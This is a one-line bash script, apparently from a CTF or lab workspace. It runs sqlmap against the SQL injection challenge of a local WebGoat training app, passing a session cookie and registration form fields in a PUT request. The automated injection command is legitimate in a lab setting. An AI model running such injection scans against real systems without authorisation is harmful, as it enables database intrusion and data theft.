#!/usr/bin/env bash

python ~/workspace/CTF/tools/sqlmap/sqlmap.py --cookie "JSESSIONID=E631A687C2F456BC15FD067950B3290B" -u http://127.0.0.1:8080/WebGoat/SqlInjection/challenge --data "username_reg=tom1&email_reg=aaa%40bbb.ccc&password_reg=1&confirm_password_reg=1" --method "PUT"
